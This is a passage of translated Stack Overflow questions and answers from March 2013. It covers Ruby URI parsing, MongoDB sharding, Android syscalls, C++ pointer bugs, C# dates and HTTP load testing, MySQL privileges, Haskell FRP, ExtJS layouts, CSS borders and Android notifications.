http://website.me:3000/ 
```

所以它返回：

```
stuffs/5715?vars= 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T17:39:02.057

您应该真正使用[`URI`Ruby 核心中的类](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/uri/rdoc/URI.html)：

```
require 'uri'

URI.parse('http://website.me/stuffs/5715?vars=').request_uri
#=> "/stuffs/5715?vars=" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:27:35.527

`http://[^/]+/(.*)`

该`(.*)`部分应捕获域名之后的所有内容（如果包含端口号，则包含端口号）并将其存储在捕获组 1 中。如何访问捕获组是特定于语言/实现的。这个正则表达式的工作原理是匹配第一个之后`/`出现的第一个之后的所有内容`http://`。

# mongodb - mongo shard config server high CPU

> ID：15163385
> 
> 赞同：1
> 
> 时间：2013-03-01T17:25:44.917
> 
> 标签：mongodb, sharding

我们正在运行一个带有四个 replset 分片和三个分片配置服务器的分片 mongodb (v2.2) 集群，所有这些都根据 10gen 的文档进行设置。

我们在 AWS EC2 上运行这个集群，三台配置机器为 t1.micro。

我们在客户端机器上运行 mongos，如下所示：

```
mongos --fork --logpath /mnt/log/mongodb.log --configdb cfg1,cfg2,cfg3 
```

根据文档，mongos 守护进程的每个实例都应该以相同的配置服务器顺序启动（例如 cfg1、cfg2、cfg3）。

我们的问题是机器 cfg1 变得非常慢 - 反过来减慢了我们所有的客户端连接。我们最近添加了大量客户端连接，不久之后开始注意到 cfg1 上的 CPU 一直处于 100% 的最大值，而其他两台机器没有问题。

有人遇到过类似的事情吗？我们曾尝试将 cfg1 升级到 m1.medium，但我们担心这只是在避免问题而不是解决问题。

# android - 使用 syscall (Linux/Android) 调用自定义内核函数时传递了错误的参数

> ID：15163391
> 
> 赞同：1
> 
> 时间：2013-03-01T17:26:14.560
> 
> 标签：android, c, linux, kernel

我正在尝试向 Android 内核添加一个功能。目前我可以用来`syscall`调用该函数，但是在调试之后`printk`我发现系统调用号本身作为第一个参数传递给我的内核函数，使得所有其他参数也错误......关于可能原因的任何想法为了这？

非常感谢！

**编辑：**

`asmlinkage`在定义和声明（in）中一致地添加`syscalls.h`可以解决问题。但是我仍然没有看到像`sys_getpid`（用`DEFINE_SYSCALL0`宏定义`timer.c`）这样的系统函数这样做 - 他们只在他们的声明之前添加那个宏`syscall.h`。如果我遵循这一点，编译将由于声明和定义中的函数签名不一致而失败。说明……？

# c++ - try catch 对 char** 返回值有影响

> ID：15163393
> 
> 赞同：1
> 
> 时间：2013-03-01T17:26:29.900
> 
> 标签：c++, char, return, try-catch

```
char **test()
{
    char *a[3];
    a[0] = (char *) malloc(sizeof(char) *3);
    a[1] = (char *) malloc(sizeof(char) *3);
    a[0] = "aa";
    a[1] = "bb";
    return a;
}   

//main
try{
    char **  a;
    a = test();
    cout << a[0] << " " << a[1];
}
catch(std::exception){} 
```

在vs2008中编译，这个程序没有输出“bb”，但是我删除try catch块后，结果是“aa bb”，这是真的。原因和解决方法？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T17:31:13.690

该程序具有未定义的行为，因为您正在返回指向本地的指针。您需要分配`a`数组`malloc`以解决问题：

```
char **test() {
    char **a = (char**)malloc(sizeof(char*) * 2);
    a[0] = (char *) malloc(sizeof(char) *3);
    a[1] = (char *) malloc(sizeof(char) *3);
    strcpy(a[0], "aa");
    strcpy(a[1], "bb");
    return a;
} 
```

当然，现在你完全负责释放你的所有`malloc`-ed 内存`main`，以避免内存泄漏（你已经在你的实现中陷入困境；现在你只需将第三个添加`free`到调用者）。

您看到的差异很可能是由于使用和不使用`try`/`catch`块的堆栈管理的差异。似乎没有`try`/本地数据仍然可供您打印，即使在函数`catch`返回后引用它不再合法。`test()`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:41:04.137

问题1：返回一个指向本地数组的指针。当函数返回时，这将被销毁，然后使用指针会给出未定义的行为。

问题 2：显式内存管理，并用指向字符串文字的指针覆盖指向已分配内存的指针。你分配的内存泄露了；如果您尝试修改文字，您将获得更多未定义的行为。

假设您正在编写 C++，而不是 C，以下将解决这两个问题：

```
std::vector<std::string> test() {return {"aa", "bb"};} 
```

# c# - 检索前一个星期二的日期

> ID：15163394
> 
> 赞同：0
> 
> 时间：2013-03-01T17:26:34.220
> 
> 标签：c#, datetime

我需要检索上周二相对于任何给定日期的日期、月份和年份。例如，今天是 2013 年 3 月 1 日星期五。我希望我的方法返回前一个星期二的日期：2013 年 2 月 26 日。我该如何实现？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T17:41:38.657

这应该可以解决问题。

```
var yesterday = DateTime.Now;

while(yesterday.DayOfWeek != DayOfWeek.Tuesday) {
  yesterday = yesterday.AddDays(-1);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:50:38.110

我会做这样的事情：

```
var lastTuesday = DateTime.Today.AddDays(
     -1 * (DateTime.Today.DayOfWeek - DayOfWeek.Tuesday));  
var lastMonday = DateTime.Today.AddDays(
     -1 * (DateTime.Today.DayOfWeek - DayOfWeek.Monday)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T18:35:22.830

这基本上在这里得到了回答：[获取一周的第一个星期一的日期？](https://stackoverflow.com/questions/1665832/get-date-of-first-day-of-week)

```
DateTime input = DateTime.Now;
int delta = DayOfWeek.Tuesday - input.DayOfWeek;
DateTime tuesday = input.AddDays(delta); 
```

# django - Django 片段安装

> ID：15163399
> 
> 赞同：-1
> 
> 时间：2013-03-01T17:26:38.460
> 
> 标签：django, code-snippets, breadcrumbs

我已经为面包屑下载了[http://www.djangosnippets.org/snippets/1289/](http://www.djangosnippets.org/snippets/1289/)，如何在应用程序中配置它？即在哪里放置文件和任何配置更改？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T23:28:04.097

您可能对 Django 很陌生，因此您可能需要阅读一些内容。

您链接到的代码段基本上是一个标签库。您可以在官方文档中了解如何[创建和使用 Django 标签库。](https://docs.djangoproject.com/en/dev/howto/custom-template-tags/)

对于它的价值，我会将我的标签库放在`tags.py`Django 应用程序的一个文件中。

# mysql - 对用户隐藏数据库，同时允许用户查询它

> ID：15163402
> 
> 赞同：0
> 
> 时间：2013-03-01T17:26:45.767
> 
> 标签：mysql, database, phpmyadmin

我希望有人可以帮助我解决 mySQL / phpMyAdmin 问题。（我什至不知道这是否可能......）

问题是：我有 2 个数据库：DB1 和 DB2 我有一个用户 DB1user。此用户对 DB1 具有完全访问权，并且对 DB2 中的特定表具有选择访问权。我希望有一种方法可以对用户隐藏 DB2。即当用户键入'SHOW DATABASES;'时，我希望该用户只看到DB1。但是，当用户键入“SELECT * FROM DB2.TABLE1;”时，他应该会看到他的查询结果。

这可能吗？可行吗？

谢谢您的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:31:25.793

您是否尝试使用 phpMyAdmin 中的权限页面，您可以在其中创建用户并限制他们对特定数据库和操作的访问？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:29:47.387

这两个查询会将用户限制在单个数据库中，以便用户只能查看、更新和删除该单个数据库中的表：

将 USER 替换为 MySQL 用户名

将 USERDATABASE 替换为您希望用户有权访问的单个 MySQL 数据库。

```
REVOKE ALL PRIVILEGES,GRANT OPTION from USER; 

GRANT ALL ON USERDATABASE.* TO 'USER'; 
```

# google-chrome-extension - 寻找一些类似互斥锁的机制来进行独占 USB 访问

> ID：15163403
> 
> 赞同：0
> 
> 时间：2013-03-01T17:26:45.983
> 
> 标签：google-chrome-extension

我正在研究各种 USB 硬件设备，每个硬件设备都实现了一个串行端口。我想通过系统上以伪并行方式运行的多个（Chrome 和非 Chrome）应用程序访问此类串行端口。

基本上我想使用一些类似互斥锁的原子原语，这样我就可以确保一个应用程序可以同时访问串行端口，而其他应用程序暂时被阻止，等待互斥锁被释放。

恐怕 Chrome API 不提供任何此类低级原语，但请反驳我。另外，我愿意接受任何建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-03T14:04:25.443

我刚刚阅读了完整的 Chrome 打包应用程序 API，并且绝对不支持互斥锁，但互斥锁无论如何只能在进程中工作，所以这不是我想要的开始。

我可以创建一个本机应用程序，它可以绑定到本地环回接口上的多个端口，并将这些连接代理到 /dev/ttyACM* 串行接口。

另一种解决方案是在固件中为我的 USB 设备实现多个串行端口，以便多个客户端可以连接到我的设备而不受干扰。

我想我会选择后一种解决方案，因为我不想让守护程序代理一直在后台运行。

# haskell - Reactive-Banana 中的动态事件切换

> ID：15163414
> 
> 赞同：9
> 
> 时间：2013-03-01T17:27:17.247
> 
> 标签：haskell, frp, reactive-banana

我目前正在开发一个使用反应香蕉和 SDL 的小游戏。由于目标主要是了解更多关于响应式香蕉和 FRP 的知识，因此我尝试使用动态切换来设置游戏对象的集合，但到目前为止还没有取得多大成功。

在 Bartab 示例中，我发现唯一使用事件切换的示例，最终触发在集合中创建新条目的事件是从事件网络外部获取的，而不是使用内部事件。我的问题是：这是唯一的方法还是只是这个例子的一个特例？

在反应香蕉中是否有更多动态事件切换的例子？

据我了解，我得到了一个 Moment t（Anytime Behavior a），使用 execute 创建一个 Event t（Anytime Behavior a），然后又用于更新携带集合的 Behavior。Moment t (Anytime Behavior a) 是在从触发事件创建的行为上使用 trimB 创建的。如果此触发事件源自事件网络，则不会编译并显示错误消息“无法推断 (t ~ t1)”。我不确定 ~ 到底是什么意思，但它显然会引发错误，因为事件网络的两个框架值 (t) 和这个新的 Moment 值不同。

所以，长话短说，我不明白反应香蕉中的事件切换是如何工作的，我不知道为什么。理论上应该相对简单。

编辑：

```
-- Event Network
-- ==========================
setupNetwork :: forall t. Frameworks t => (EventSource Command, EventSource ()) -> IORef SpriteMap -> GameMap -> Moment t ()
setupNetwork ((addHandlerE, _), (addHandlerT, _)) sprites map = do

        -- Input Events
        ----------------
        eInput <- fromAddHandler addHandlerE -- Player Commands
        eFrame <- fromAddHandler addHandlerT -- Event on each Frame

        let
            [...]

            eSpawnEvent :: Event t (DSCoord)
            eSpawnEvent = extractCoord <$> eLeftClick 
                where
                        extractCoord (LeftClick c) = c

            spawnPos :: Frameworks s => Moment s (AnyMoment Behavior DSCoord)
            spawnPos = trimB $ stepper (0,0) eSpawnEvent

        eSpawnPos <- execute $ (FrameworksMoment spawnPos <$ eSpawnEvent)
                [...] 
```

我只是尝试从示例中镜像 newEntry / eNewEntry，只是使用正常事件来创建新行为。这会在 spawnPos 中产生“无法推断 (t ~ s)”错误。

编辑2：

它可以工作，但现在在我使用执行创建事件的行上出现了同样的错误。“无法推断出 t ~ t1”

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-03T08:46:30.910

在我看来，除了一个小错误之外，代码基本上是正确的：

编译器正确地抱怨`spawnPos`具有（多态）开始时间`s`，而开始时间`eSpawnEvent`固定为`t`，这是不同的。`forall t`后一种时间通过`setupNetwork`. 也就是说，`t`表示整个网络的开始时间。

简单的解决方法是将违规行更改为

```
spawnPos :: Frameworks t => Moment t (AnyMoment Behavior DSCoord) 
```

# automation - 如何使用串行通信更改PowerPoint演示文稿的幻灯片？

> ID：15163435
> 
> 赞同：0
> 
> 时间：2013-03-01T17:28:30.610
> 
> 标签：automation, serial-port, arduino, slideshow, powerpoint

我有一个 arduino uno 套件。我会给它信号。这些信号应该能够在幻灯片中导航。这些信号也将通过串行端口传来。因此，是否有任何软件可以让我直接进行所需的幻灯片更改？或者我应该为此编写代码吗？如果是这样的话，我对这种类型的东西还是很陌生的语言！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T22:51:40.773

一种可能性是让 arduino 模拟串行鼠标协议并发送鼠标单击以进行 Powerpoint 导航（就像按下鼠标按钮转到下一张或上一张幻灯片一样）。问题是，据我所知，Arduino 没有串行鼠标仿真库，但我可能错了。

另一种选择是使用[LUFA](http://www.fourwalledcubicle.com/LUFA.php) USB 库让您的 UNO 模拟 USB 鼠标。此选项的问题在于，虽然 LUFA 与 UNO 硬件兼容，但您需要重新刷新固件。而且我相信您无法使用 arduino IDE 对其进行编程。

最简单的选择是不使用 UNO，而是让[Leonardo](http://arduino.cc/en/Main/ArduinoBoardLeonardo)或[Teensy](http://www.pjrc.com/store/teensy.html)都可以充当 USB 鼠标设备，并且可以使用 Arduino IDE 进行编程。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T21:31:30.423

这与这个问题基本相同：[从 VBA 访问串行端口的最佳方法是什么？](https://stackoverflow.com/questions/569698/what-is-the-best-way-to-access-a-serial-port-from-vba)

答案参考这里：[http ://www.thescarms.com/vbasic/commio.aspx](http://www.thescarms.com/vbasic/commio.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-02T19:23:56.047

最困难的部分是读取传入的串行数据并确保其有效。然后，根据您收到的命令（下一张幻灯片、上一张幻灯片等），将[模拟](http://msdn.microsoft.com/en-us/library/windows/desktop/ms644950%28v=vs.85%29.aspx)的鼠标点击或键盘按下发送到 PowerPoint。更好的是，您可以只使用[PowerPoint COM](http://msdn.microsoft.com/en-ca/library/microsoft.office.interop.powerpoint.aspx)接口。

# extjs - 2.1.1 版本的卡片布局中未显示列表。在 2.0 版本中完美运行

> ID：15163441
> 
> 赞同：0
> 
> 时间：2013-03-01T17:28:46.763
> 
> 标签：extjs, sencha-touch

重要提示：这适用于 2.0 版而不是 2.1.1 版

我的应用程序底部有 2 个不同的选项卡（附近，搜索）这两个选项卡都使用下面给出的相同列表。NearBy 和 Search 都使用卡片布局，唯一的区别是 Near By 列表位于第一张卡片中，而 Search 列表位于第二张卡片中

我在最后 2 天尝试这个，但没有任何进展。请帮我

```
Ext.define('ChurchLookup.view.ChurchList', {
extend: 'Ext.List',
xtype: 'churchlist',

config:
{
    title: 'Zip Code',
    cls: 'x-contacts',
    grouped: true,
    store: 'Churches',
    itemTpl:
    [
        '<div class="headshot" style="background-image:url(resources/images/church-type-logo/{icon}.png);"></div>',
        '{name}, {city}',
        '<span>{phone} / {email}</span>'
    ].join('')
}}); 
```

对于单击选项卡时的附近，列表将显示在选项卡面板内。这工作得很好，我可以看到列表。

**靠近卡代码**

```
Ext.define('ChurchLookup.view.NearBy',
{
    extend: 'Ext.Panel',
    xtype: 'nearbycard',
    config:
    {
        iconCls: 'locate',
        title: 'Near By',
        scrollable: 'vertical',
        layout:
        {
              type: 'card',
              animation:
            {
                type: 'pop',
                duration: 500,
            }
        },
        items:
        [
            {
                docked: 'top',
                xtype: 'titlebar',
                title: 'Near by Churches',
                items:
                [
                    {
                        itemId: 'btnBackNearBy',
                        text: "Back",
                        ui: "back",
                        hidden: true,
                        action:  'onBackNearBy'
                    }/*,
                    {
                        itemId: 'btnHomeSettings',
                        iconMask:true,
                        iconCls: 'settings',
                        ui:      'border',
                        align:   'right',
                        action:  'pingHomeBadge'
                    }*/
                ]
            },
            {
                xtype: 'churchlist'
            },
            {
                xtype: 'churchdetailsnearby'
            }
        ],
        listeners:
        [
            {
                delegate: "#btnHomeSettings",
                event: "tap",
                fn: "onHomeScreenSettings"
            },
            {
                delegate: "#btnBackNearBy",
                event: "tap",
                fn: "onBackNearBy"
            }
        ]
    },
    onHomeScreenSettings: function ()
    {
        this.fireEvent("homeScreenSettings", this);
    },
    onBackNearBy: function ()
    {
        this.fireEvent("onBackNearBy", this);
    }
}); 
```

但是对于我们单击“搜索”选项卡时的搜索，它将显示带有 2 张卡片的卡片布局。第一张卡片是搜索表单，第二张卡片是列表。当用户填写表格并单击搜索按钮时，我只需加载商店并更改卡片布局以显示列表。但是卡片布局显示的是第二页而不是列表。

**搜索标签代码**

```
Ext.define('ChurchLookup.view.Search',
{
    extend: 'Ext.Panel',
    xtype: 'searchcard',
    config:
    {
        iconCls: 'search',
        title: 'Search',
          scrollable: 'vertical',
        layout:
        {
              type: 'card',
              animation:
            {
                type: 'pop',
                duration: 500,
            }
        },
        items:
        [
            {
                docked: 'top',
                xtype: 'titlebar',
                title: 'Search Church',
                items:
                [
                    {
                        itemId: 'btnBackSearch',
                        text: "Back",
                        ui: "back",
                        hidden: true,
                        action:  'onBackSearch'
                    }/*,
                    {
                        itemId: 'btnHomeSettings',
                        iconMask:true,
                        iconCls: 'settings',
                        ui:      'border',
                        align:   'right',
                        action:  'pingHomeBadge'
                    }*/
                ]
            },
            {
                xtype: 'searchform'
            },
            {
                xtype: 'favouritecard'
            },
            {
                xtype: 'churchdetailssearch'
            }
        ],
        listeners:
        [
            {
                delegate: "#btnHomeSettings",
                event: "tap",
                fn: "onHomeScreenSettings"
            },
            {
                delegate: "#btnBackSearch",
                event: "tap",
                fn: "onBackSearch"
            }
        ]
    },
    onHomeScreenSettings: function ()
    {
        this.fireEvent("homeScreenSettings", this);
    },
    onBackSearch: function ()
    {
        this.fireEvent("onBackSearch", this);
    }
}); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-08T04:51:51.710

可能是身高问题。

'churchdetailssearch' 和 'churchlist' 一样吗？

如果churchdetailssearch'有工具栏或其他设置布局：'vbox'到'churchdetailssearch'，并添加'churchdetailssearch'的列表弹性：1。

也许有用的页面。 [解释可滚动列表如何使用没有固定高度的动态高度](http://www.sencha.com/forum/showthread.php?184110-Explain-how-to-a-scrollable-List-use-dynamic-height-without-fixed-height)

# css - 覆盖边框样式的用户代理样式表

> ID：15163448
> 
> 赞同：0
> 
> 时间：2013-03-01T17:29:03.333
> 
> 标签：css, styles, overriding, user-agent

首先，让我说我对一般编码很陌生，所以请在你的回复中具体说明=）我在我正在处理的网站上遇到图像边框问题。您可以在此处查看该网站：http: [//eventswithvizability.ca/](http://eventswithvizability.ca/)

我在页面重新加载时旋转了 10 张图片，您可以在此处查看 HTML：

```
 <SCRIPT LANGUAGE="Javascript">
    function banner() { } ; b = new banner() ; n = 0
    b[n++]= "<IMG name=randimg  CLASS='aligncenter1'>"
    b[n++]= "<IMG name=randimg   CLASS='aligncenter2'>"
    b[n++]= "<IMG name=randimg   CLASS='aligncenter3'>"
    b[n++]= "<IMG name=randimg   CLASS='aligncenter4'>"
    b[n++]= "<IMG name=randimg   CLASS='aligncenter5'>"
    b[n++]= "<IMG name=randimg   CLASS='aligncenter6'>"
    b[n++]= "<IMG name=randimg  CLASS='aligncenter7'>"
    b[n++]= "<IMG name=randimg   CLASS='aligncenter8'>"
    b[n++]= "<IMG name=randimg   CLASS='aligncenter9'>"
    b[n++]= "<IMG name=randimg  CLASS='aligncenter10'>"
    i=Math.floor(Math.random() * n) ; 
    document.write( b[i] )
    </SCRIPT> 
```

基本上我不希望我的图像周围有边框。我安装了 firebug，当检查正在读取图像样式的元素时我可以看到（所以没有边框），但我所做的没有改变我的图像周围仍然显示边框的事实。

```
 media="all"
    img[class*="align"], img[class*="wp-image-"] {
    margin: auto;
    border: none !important;
    border-style: none !important;
    border-width: 0 !important;
    border-bottom-color: transparent !important; 
    /*test to see if I can get rid of bottom border*/
    } 
```

我已经尝试修复我的文档类型，添加一个重置样式表，在所有地方添加 !important，并阅读我可以在谷歌上找到的所有内容，但它仍然在使用这个**边框样式：初始；**来自某处的脚本。如果是浏览器，那么我的重置样式表应该已经处理好了..对吗？

请帮忙！我很想弄清楚这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-03T01:29:56.473

**简短的回答**

这是渲染引擎中的一个错误，您通过尝试为`img`标记提供透明 .PNG 作为背景然后重新缩放它来触发该错误。您可以通过以下任一方式解决此问题：

1.  `img`将您的标签更改为`div`标签 - 这样浏览器就可以轻松地为它们提供背景。
2.  不要设置`img`标签的背景属性，而是将它们设置`src`为图像 URL。

**长答案**

边框不是用 CSS 创建的；你可以告诉这一点，因为如果你添加一个像`border:1px solid black`新边框这样的边框属性将与给你带来麻烦的那个共存。同理，`border-style:initial`没有错；这只是您陈述的副作用`border-none`（`initial`只是意味着元素应该采用属性的默认值）。

技术原因与重新缩放透明 .PNG 时浏览器渲染引擎中的错误有关。在其他地方发现的一些类似错误的例子在[这里](https://stackoverflow.com/questions/538082/firefoxs-renders-thin-grey-lines-at-content-box-edges-of-a-png-at-certain-widths)和[这里](https://bugzilla.mozilla.org/show_bug.cgi?id=490997)。

但在您的情况下，问题的直接原因似乎是用于显示图像的某种非正统方法，特别是使用透明 .PNG 作为`img`标签的背景（而不是源）。这将是不好的做法，即使在拉伸透明 .PNG 以填充 .PNG 背景的过程中`img`，渲染引擎正在创建看起来像边框的灰色工件。

如果你想在 Javascript 中实现第二个选项，以下应该可以解决问题：

```
<script language="javascript">
    i= Math.floor(1 + Math.random() * 9);
    if (i < 10) {
        i = "0" + i
    }
    document.write('<img src="http://eventswithvizability.ca/wp-content/themes/lugada/images/bottom' + i + '.png" class="random_image" id="random_image_' + i + '" alt="" />')
</script> 
```

请注意，您无需为每个图像单独存储的代码创建一个数组，您可以只生成随机变量，然后使用字符串连接来动态修补一个`img`标签。

此外，如果不是为每个图像设置 10 个自定义 CSS 类，它们都具有相同的内容，而是将一个类应用于所有图像，那么您通常会为自己省去麻烦。请记住，`id`属性必须是唯一的，但类不能。

# c# - System.OutOfMemoryException' 被抛出 - WebClient.DownloadStringAsynch()

> ID：15163451
> 
> 赞同：1
> 
> 时间：2013-03-01T17:29:12.240
> 
> 标签：c#, multithreading, threadpool, out-of-memory

我正在编写一个糟糕的负载测试器，我认为我正在正确管理我的资源（线程池），但是当我运行以下代码时，我在调用 WebClient.DownloadStringAsynch 时收到了 OutOfMemoryException。

使用 .net4.0 但可以迁移到 4.5。

问：

*   解决方法是什么？
*   我如何使用 HttpWebRequest 并发送该异步作为 webclient 的替代方案？
*   使用 .net 4.5 使用 await 怎么样（与 .net4 如何通过异步调用管理线程有什么区别？

    ```
    static void Main(string[] args)
    {
        System.Net.ServicePointManager.DefaultConnectionLimit = 200;
        while (true)
        {
            for (int i = 0; i < 100; i++)
            {
                Task.Factory.StartNew(LoadTestAsynchNET40);
            }
            Console.WriteLine(".........................sleeping...............................");
            Thread.Sleep(2);
        }
    }

    static void LoadTestAsynchNET40()
    {
      string url = "http://mysrv.com/api/dev/getthis?stuff=thestuff" + "&_=" + DateTime.Now.Ticks;  // <--- somtimes throws here...
        using (var client = new WebClient())
        {
            DateTime dt1 = DateTime.Now;
            client.Headers["Accept"] = "text/xml";
            client.DownloadStringCompleted += DownloadStringCompleted;
            Console.WriteLine(DateTime.Now.ToString("ss:fff") + ", Sent Ad Request...");
            client.DownloadStringAsync(new Uri(url), dt1); //<---throws here...
        }
    }

    static void DownloadStringCompleted(object sender, DownloadStringCompletedEventArgs e)
    {
        Console.WriteLine("Received reponse...");

    } 
    ```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T17:33:01.940

`DownloadStringAsync`将创建一个包含整个响应的巨型字符串。
如果您将其称为大量响应，那么您将耗尽内存。

相反，您应该`HttpWebRequest`直接使用。
它的`GetResponse()`（或`BeginGetResponse()`）方法为您提供了一个*流*，允许您直接从服务器读取响应，而无需将其缓冲在内存中。

如果您仍然想要异步，您应该移动 .Net 4.5，它添加了更易于使用的`GetResponseAsync()`方法（相对于旧的基于 APM 的方法`BeginGetResponse()`）

# c# - Windows Phone 7 访问目录时崩溃

> ID：15163455
> 
> 赞同：0
> 
> 时间：2013-03-01T17:29:20.683
> 
> 标签：c#, windows-phone-7, file-io, io, xna

我无法使用 C# 在 Windows Phone 7 中获取有关目录的信息。当我调用时，我的应用程序冻结或崩溃：

```
System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo("Content/Levels"); 
```

当我尝试确定应用程序的路径时，它也会冻结，所以我认为这就是问题所在。

我可能做错了什么，我能做些什么来解决这个问题？

**更新：** 似乎这个问题与一个安全问题有关，但我不知道如何解决这个问题。是否有另一种方法可以在没有这个安全问题的情况下找到根目录？

如果有所不同，这些文件将存储在 XNA 内容管道中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-02T03:41:38.337

要访问实际 xap 中的文件（称为“标题存储”），首先必须将其`Content`从 XNA 内容管道中导出。从您的内容项目中选择文件并在属性下将其设置`Build Action`为`Content`（我相信`None`做同样的事情）。现在，它们将直接原始导出到您的 XAP，并且可以在您的游戏/应用程序中访问。

其次，要从标题存储中访问文件，您不能直接在 WP7 上直接访问根目录。使用[此类](http://msdn.microsoft.com/en-us/library/microsoft.xna.framework.titlecontainer.openstream.aspx)从标题存储访问文件：

```
using (StreamReader r = 
new StreamReader(TitleContainer.OpenStream("Content/Levels/Level1.xml")))
{
    //read the file
} 
```

该方法返回`System.IO.Stream`可用于直接访问文件本身的 a。

如果您的游戏需要知道特定文件夹中的所有文件，则该平台上实际上不允许目录枚举等，因此您必须在编译时预先生成它，这可以使用内容管道：

[http://xbox.create.msdn.com/en-US/sample/contentmanifestextensions](http://xbox.create.msdn.com/en-US/sample/contentmanifestextensions)

# android - 通知进入活动时强制关闭

> ID：15163459
> 
> 赞同：0
> 
> 时间：2013-03-01T17:29:40.250
> 
> 标签：android, service, android-activity, notifications, forceclose

我正在Android中制作一个项目。

当我在活动（groups.class）中时，我正在调用这个函数（在活动中声明）：

```
 public void lookForGroups()
    {
        int seconds = 20;

           Intent myIntent = new Intent(Groups.this, GroupsTaskAlarmChecker.class);
           pendingIntent = PendingIntent.getService(Groups.this, 0, myIntent, 0);

           AlarmManager alarmManager = (AlarmManager)getSystemService(ALARM_SERVICE);

           Calendar calendar = Calendar.getInstance();
           calendar.setTimeInMillis(System.currentTimeMillis());
           calendar.add(Calendar.SECOND, 10);
           alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), seconds * 1000, pendingIntent);

    } 
```

在服务内部，我连接到 web 中的 php 并接收答案，然后创建一个通知（在服务内部声明），将消息发送到调用函数 notifyNew() 的处理程序。

```
public class GroupsTaskAlarmChecker extends Service implements Runnable {
         public void run() { php call and send msg to handler to call notify function}
         private void notifyNew() { 
        Intent intentNot = new Intent(this, Groups.class);

        Notification notification = new Notification(R.drawable.icon, "changes", System.currentTimeMillis());
        notification.setLatestEventInfo(this, getString(R.string.app_name), getString(R.string.notifiedGroup), 
                PendingIntent.getActivity(this, 0, intentNot, PendingIntent.FLAG_CANCEL_CURRENT));

        notification.defaults |= Notification.DEFAULT_SOUND;
        notification.defaults |= Notification.DEFAULT_VIBRATE;

        notification.defaults |= Notification.DEFAULT_LIGHTS;
        notification.flags = Notification.FLAG_AUTO_CANCEL;

        try
        {
            notification.ledARGB = 0xff00ff00;
            notification.ledOnMS = 300;
            notification.ledOffMS = 1000;
            notification.flags |= Notification.FLAG_SHOW_LIGHTS;
        }catch(Exception ex)
        {           
        }           
        manager.notify(APP_ID_NOTIFICATION, notification);
}  
} 
```

触摸通知时，我想再次进入活动“组”。所有这一切都很好，但是当我触摸通知 logCat 时显示......

```
03-01 17:52:50.663: E/AndroidRuntime(17019): FATAL EXCEPTION: main
03-01 17:52:50.663: E/AndroidRuntime(17019): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.org.tfc_android/com.org.tfc_android.Groups}: java.lang.NullPointerException
03-01 17:52:50.663: E/AndroidRuntime(17019):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2304)
03-01 17:52:50.663: E/AndroidRuntime(17019):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2354)
03-01 17:52:50.663: E/AndroidRuntime(17019):    at android.app.ActivityThread.access$600(ActivityThread.java:150)
03-01 17:52:50.663: E/AndroidRuntime(17019):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1244)
03-01 17:52:50.663: E/AndroidRuntime(17019):    at android.os.Handler.dispatchMessage(Handler.java:99)
03-01 17:52:50.663: E/AndroidRuntime(17019):    at android.os.Looper.loop(Looper.java:137)
03-01 17:52:50.663: E/AndroidRuntime(17019):    at android.app.ActivityThread.main(ActivityThread.java:5193)
03-01 17:52:50.663: E/AndroidRuntime(17019):    at java.lang.reflect.Method.invokeNative(Native Method)
03-01 17:52:50.663: E/AndroidRuntime(17019):    at java.lang.reflect.Method.invoke(Method.java:511)
03-01 17:52:50.663: E/AndroidRuntime(17019):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:795)
03-01 17:52:50.663: E/AndroidRuntime(17019):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:562)
03-01 17:52:50.663: E/AndroidRuntime(17019):    at dalvik.system.NativeStart.main(Native Method)
03-01 17:52:50.663: E/AndroidRuntime(17019): Caused by: java.lang.NullPointerException
03-01 17:52:50.663: E/AndroidRuntime(17019):    at com.org.tfc_android.Groups.onCreate(Groups.java:61)
03-01 17:52:50.663: E/AndroidRuntime(17019):    at android.app.Activity.performCreate(Activity.java:5104)
03-01 17:52:50.663: E/AndroidRuntime(17019):    at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1080)
03-01 17:52:50.663: E/AndroidRuntime(17019):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2258)
03-01 17:52:50.663: E/AndroidRuntime(17019):    ... 11 more 
```

有一个强制关闭，但后来转到活动组有人可以帮助我吗？

已解决：已解决添加 intentNot.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 在通知之前创建意图时。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T13:55:29.663

我解决了 add intentNot.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 感谢@FahadIshaque

# ruby-on-rails - 在 Rails 控制台中使用 html_escape 等辅助方法

> ID：15163460
> 
> 赞同：10
> 
> 时间：2013-03-01T17:29:45.073
> 
> 标签：ruby-on-rails, html-escape

我试图在我的视图中查看我的变量编码出了什么问题。所以我启动了rails控制台并尝试做

```
$ rails console
Loading development environment (Rails 3.2.11)
